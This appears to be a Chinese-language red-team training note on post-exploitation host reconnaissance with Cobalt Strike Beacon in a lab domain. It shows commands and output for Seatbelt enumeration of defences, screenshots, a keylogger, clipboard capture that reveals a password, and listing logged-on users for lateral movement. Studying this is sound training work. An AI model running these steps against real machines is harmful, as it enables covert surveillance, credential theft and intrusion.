# Host Reconnaissance

主机侦查

> 在我们执行任何post-exploitation步骤之前，谨慎的做法是评估当前情况。我们执行的每项操作都存在一定的检测风险。这种风险的程度取决于我们的能力和任何防御者的能力。我们可以枚举主机以了解它受到保护和监控的程度。这可以包括防病毒 (AV) 或端点检测和响应 (EDR) 软件、Windows 审核策略、PowerShell 日志记录、事件转发等。

# Processes

使用```ps```命令列出系统上正在运行的进程

有几个有趣的过程，包括```Sysmon64、MsMpEng、elastic-endpoint和elastic-agent```。当以中等完整性(medium integrity)（即标准用户）运行时，您将无法查看当前用户不拥有的进程的架构、会话和用户信息

# Seatbelt

[Seatbelt](https://github.com/GhostPack/Seatbelt)是一个c#编写的用于主机探测的工具

什么是Common Language Runtime (CLR)？
.NET Framework 的一个组件，用于管理 .NET 程序集的执行，每个 .NET Framework 版本都设计为在特定版本的 CLR 上运行


枚举.NET Framework版本
```
beacon> reg queryv x64 HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full Release

Release                  460805
```

execute-assembly命令允许 Beacon 直接从内存运行 .NET 可执行文件，因此（一般而言）无需在运行这些工具之前将它们上传到磁盘
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
```

上面命令会产生大量输出，在安全配置方面主要留意下面的内容
```
====== AppLocker ======
[*] Applocker is not running because the AppIDSvc is not running

====== LAPS ======
LAPS Enabled                  : True

====== OSInfo ======
IsLocalAdmin                  :  False

====== PowerShell ======
Script Block Logging Settings
Enabled                       : True

====== Services ======
Non Microsoft Services (via WMI)

Name                          : Sysmon64
BinaryPath                    : C:\Windows\Sysmon64.exe
FileDescription               : System activity monitor

====== Sysmon ======
ERROR: Unable to collect. Must be an administrator.

====== UAC ======
[*] LocalAccountTokenFilterPolicy == 1. Any administrative local account can be used for lateral movement.

====== WindowsFirewall ======
Domain Profile
  Enabled                  : False

Private Profile
  Enabled                  : False

Public Profile
  Enabled                  : False
```


枚举用户环境变量
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user
```

这个映射的驱动器条目向我们展示了用户配置文件放在远程共享上
```
Mapped Drives (via WMI)

  LocalName                      : H:
  RemoteName                     : \\dc-2\home$\bfarmer
  RemotePath                     : \\dc-2\home$\bfarmer
  Status                         : OK
  ConnectionState                : Connected
  Persistent                     : False
  UserName                       : DEV.CYBERBOTIC.IO\bfarmer
  Description                    : RESOURCE CONNECTED - Microsoft Windows Network
```

# Screenshots

屏幕截图

目的：可以显示用户正在使用的系统或应用程序、他们拥有的快捷方式、他们正在处理的文档等等

Beacon 有多个用于截屏的命令，它们的工作方式略有不同
```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

在cobaltstrike上截图
```
View > Screenshots
```

# Keylogger

键盘记录器

作用：键盘记录器可以捕获用户的键盘敲击记录，这对于捕获用户名、密码和其他敏感数据特别有用。

```
beacon> keylogger
[+] received keystrokes from Secret Application - Google Chrome by bfarmer
```

在cobaltstrike上记录键盘日志
```
View > Keystrokes
```

停止记录键盘日志命令：jobkill 
```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1
```

# Clipboard

```clipboard```命令将捕获用户剪贴板中的任何文本（它不会捕获图像或任何其他类型的数据）

这是一次性命令（它不作为作业运行）并将内容直接转储到 Beacon 控制台

```
beacon> clipboard
[*] Tasked beacon to get clipboard contents

Clipboard Data (8 bytes):
Sup3rman
```

# User Sessions

当前登录到同一台机器的用户可能是很好的攻击目标。如果他们比我们当前在域中的用户更有特权，他们可能是横向移动到其他机器的好选择

```
beacon> net logons

Logged on users at \\localhost:

DEV\bfarmer
DEV\jking
DEV\WKSTN-2$
```